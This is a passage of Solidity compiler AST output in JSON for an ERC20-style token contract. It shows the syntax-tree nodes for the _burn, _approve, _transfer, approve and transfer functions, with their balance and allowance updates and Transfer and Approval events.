															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 197,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "2406:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 203,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2406:33:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 204,
												"nodeType": "EmitStatement",
												"src": "2401:38:0"
											}
										]
									},
									"documentation": null,
									"id": 206,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_burn",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 177,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 174,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 206,
												"src": "2253:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 173,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2253:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 176,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 206,
												"src": "2267:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 175,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2267:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2252:29:0"
									},
									"returnParameters": {
										"id": 178,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2291:0:0"
									},
									"scope": 435,
									"src": "2238:208:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 229,
										"nodeType": "Block",
										"src": "2525:96:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 221,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"baseExpression": {
																"argumentTypes": null,
																"id": 215,
																"name": "allowance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 29,
																"src": "2535:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_mapping$_t_address_$_t_mapping$_t_address_$_t_uint256_$_$",
																	"typeString": "mapping(address => mapping(address => uint256))"
																}
															},
															"id": 218,
															"indexExpression": {
																"argumentTypes": null,
																"id": 216,
																"name": "owner",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 208,
																"src": "2545:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_address",
																	"typeString": "address"
																}
															},
															"isConstant": false,
															"isLValue": true,
															"isPure": false,
															"lValueRequested": false,
															"nodeType": "IndexAccess",
															"src": "2535:16:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 219,
														"indexExpression": {
															"argumentTypes": null,
															"id": 217,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 210,
															"src": "2552:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2535:25:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"id": 220,
														"name": "value",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 212,
														"src": "2563:5:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2535:33:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 222,
												"nodeType": "ExpressionStatement",
												"src": "2535:33:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 224,
															"name": "owner",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 208,
															"src": "2592:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 225,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 210,
															"src": "2599:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 226,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 212,
															"src": "2608:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 223,
														"name": "Approval",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															50
														],
														"referencedDeclaration": 50,
														"src": "2583:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 227,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2583:31:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 228,
												"nodeType": "EmitStatement",
												"src": "2578:36:0"
											}
										]
									},
									"documentation": null,
									"id": 230,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 213,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 208,
												"name": "owner",
												"nodeType": "VariableDeclaration",
												"scope": 230,
												"src": "2470:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 207,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2470:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 210,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 230,
												"src": "2485:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 209,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2485:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 212,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 230,
												"src": "2502:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 211,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2502:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2469:47:0"
									},
									"returnParameters": {
										"id": 214,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2525:0:0"
									},
									"scope": 435,
									"src": "2452:169:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 267,
										"nodeType": "Block",
										"src": "2695:151:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 248,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 239,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "2705:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 241,
														"indexExpression": {
															"argumentTypes": null,
															"id": 240,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 232,
															"src": "2715:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2705:15:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 246,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 236,
																"src": "2743:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 242,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "2723:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 244,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 243,
																	"name": "from",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 232,
																	"src": "2733:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2723:15:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 245,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sub",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2357,
															"src": "2723:19:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 247,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2723:26:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2705:44:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 249,
												"nodeType": "ExpressionStatement",
												"src": "2705:44:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"id": 259,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 250,
															"name": "balanceOf",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 23,
															"src": "2759:9:0",
															"typeDescriptions": {
																"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																"typeString": "mapping(address => uint256)"
															}
														},
														"id": 252,
														"indexExpression": {
															"argumentTypes": null,
															"id": 251,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 234,
															"src": "2769:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														"isConstant": false,
														"isLValue": true,
														"isPure": false,
														"lValueRequested": true,
														"nodeType": "IndexAccess",
														"src": "2759:13:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "Assignment",
													"operator": "=",
													"rightHandSide": {
														"argumentTypes": null,
														"arguments": [
															{
																"argumentTypes": null,
																"id": 257,
																"name": "value",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 236,
																"src": "2793:5:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															}
														],
														"expression": {
															"argumentTypes": [
																{
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															],
															"expression": {
																"argumentTypes": null,
																"baseExpression": {
																	"argumentTypes": null,
																	"id": 253,
																	"name": "balanceOf",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 23,
																	"src": "2775:9:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
																		"typeString": "mapping(address => uint256)"
																	}
																},
																"id": 255,
																"indexExpression": {
																	"argumentTypes": null,
																	"id": 254,
																	"name": "to",
																	"nodeType": "Identifier",
																	"overloadedDeclarations": [],
																	"referencedDeclaration": 234,
																	"src": "2785:2:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address",
																		"typeString": "address"
																	}
																},
																"isConstant": false,
																"isLValue": true,
																"isPure": false,
																"lValueRequested": false,
																"nodeType": "IndexAccess",
																"src": "2775:13:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"id": 256,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "add",
															"nodeType": "MemberAccess",
															"referencedDeclaration": 2335,
															"src": "2775:17:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_internal_pure$_t_uint256_$_t_uint256_$returns$_t_uint256_$bound_to$_t_uint256_$",
																"typeString": "function (uint256,uint256) pure returns (uint256)"
															}
														},
														"id": 258,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "2775:24:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "2759:40:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"id": 260,
												"nodeType": "ExpressionStatement",
												"src": "2759:40:0"
											},
											{
												"eventCall": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"id": 262,
															"name": "from",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 232,
															"src": "2823:4:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 263,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 234,
															"src": "2829:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 264,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 236,
															"src": "2833:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 261,
														"name": "Transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															58
														],
														"referencedDeclaration": 58,
														"src": "2814:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_event_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 265,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2814:25:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 266,
												"nodeType": "EmitStatement",
												"src": "2809:30:0"
											}
										]
									},
									"documentation": null,
									"id": 268,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "_transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 237,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 232,
												"name": "from",
												"nodeType": "VariableDeclaration",
												"scope": 268,
												"src": "2646:12:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 231,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2646:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 234,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 268,
												"src": "2660:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 233,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2660:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 236,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 268,
												"src": "2672:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 235,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2672:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2645:41:0"
									},
									"returnParameters": {
										"id": 238,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "2695:0:0"
									},
									"scope": 435,
									"src": "2627:219:0",
									"stateMutability": "nonpayable",
									"superFunction": null,
									"visibility": "private"
								},
								{
									"body": {
										"id": 286,
										"nodeType": "Block",
										"src": "2925:74:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 278,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2443,
																"src": "2944:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 279,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "2944:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 280,
															"name": "spender",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 270,
															"src": "2956:7:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 281,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 272,
															"src": "2965:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 277,
														"name": "_approve",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 230,
														"src": "2935:8:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 282,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "2935:36:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 283,
												"nodeType": "ExpressionStatement",
												"src": "2935:36:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 284,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "2988:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 276,
												"id": 285,
												"nodeType": "Return",
												"src": "2981:11:0"
											}
										]
									},
									"documentation": null,
									"id": 287,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "approve",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 273,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 270,
												"name": "spender",
												"nodeType": "VariableDeclaration",
												"scope": 287,
												"src": "2869:15:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 269,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "2869:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 272,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 287,
												"src": "2886:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 271,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "2886:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2868:32:0"
									},
									"returnParameters": {
										"id": 276,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 275,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 287,
												"src": "2919:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 274,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "2919:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "2918:6:0"
									},
									"scope": 435,
									"src": "2852:147:0",
									"stateMutability": "nonpayable",
									"superFunction": 1861,
									"visibility": "external"
								},
								{
									"body": {
										"id": 305,
										"nodeType": "Block",
										"src": "3074:70:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"expression": {
																"argumentTypes": null,
																"id": 297,
																"name": "msg",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 2443,
																"src": "3094:3:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_magic_message",
																	"typeString": "msg"
																}
															},
															"id": 298,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "sender",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "3094:10:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															}
														},
														{
															"argumentTypes": null,
															"id": 299,
															"name": "to",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 289,
															"src": "3106:2:0",
															"typeDescriptions": {
																"typeIdentifier": "t_address",
																"typeString": "address"
															}
														},
														{
															"argumentTypes": null,
															"id": 300,
															"name": "value",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 291,
															"src": "3110:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_address_payable",
																"typeString": "address payable"
															},
															{
																"typeIdentifier": "t_address",
																"typeString": "address"
															},
															{
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															}
														],
														"id": 296,
														"name": "_transfer",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 268,
														"src": "3084:9:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_internal_nonpayable$_t_address_$_t_address_$_t_uint256_$returns$__$",
															"typeString": "function (address,address,uint256)"
														}
													},
													"id": 301,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "3084:32:0",
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 302,
												"nodeType": "ExpressionStatement",
												"src": "3084:32:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"hexValue": "74727565",
													"id": 303,
													"isConstant": false,
													"isLValue": false,
													"isPure": true,
													"kind": "bool",
													"lValueRequested": false,
													"nodeType": "Literal",
													"src": "3133:4:0",
													"subdenomination": null,
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													},
													"value": "true"
												},
												"functionReturnParameters": 295,
												"id": 304,
												"nodeType": "Return",
												"src": "3126:11:0"
											}
										]
									},
									"documentation": null,
									"id": 306,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "transfer",
									"nodeType": "FunctionDefinition",
									"parameters": {
										"id": 292,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 289,
												"name": "to",
												"nodeType": "VariableDeclaration",
												"scope": 306,
												"src": "3023:10:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address",
													"typeString": "address"
												},
												"typeName": {
													"id": 288,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "3023:7:0",
													"stateMutability": "nonpayable",
													"typeDescriptions": {
														"typeIdentifier": "t_address",
														"typeString": "address"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 291,
												"name": "value",
												"nodeType": "VariableDeclaration",
												"scope": 306,
												"src": "3035:13:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 290,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "3035:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3022:27:0"
									},
									"returnParameters": {
										"id": 295,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 294,
												"name": "",
												"nodeType": "VariableDeclaration",
												"scope": 306,
												"src": "3068:4:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_bool",
													"typeString": "bool"
												},
												"typeName": {
													"id": 293,
													"name": "bool",
													"nodeType": "ElementaryTypeName",
													"src": "3068:4:0",
													"typeDescriptions": {
														"typeIdentifier": "t_bool",
														"typeString": "bool"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "3067:6:0"
									},
									"scope": 435,
									"src": "3005:139:0",
									"stateMutability": "nonpayable",
									"superFunction": 1870,
									"visibility": "external"
								},
								{
									"body": {
										"id": 355,
										"nodeType": "Block",
										"src": "3267:244:0",
										"statements": [
											{
												"condition": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 327,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"baseExpression": {
																"argumentTypes": null,
																"id": 317,
																"name": "allowance",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 29,
																"src": "3281:9:0",
																"typeDescriptions": {
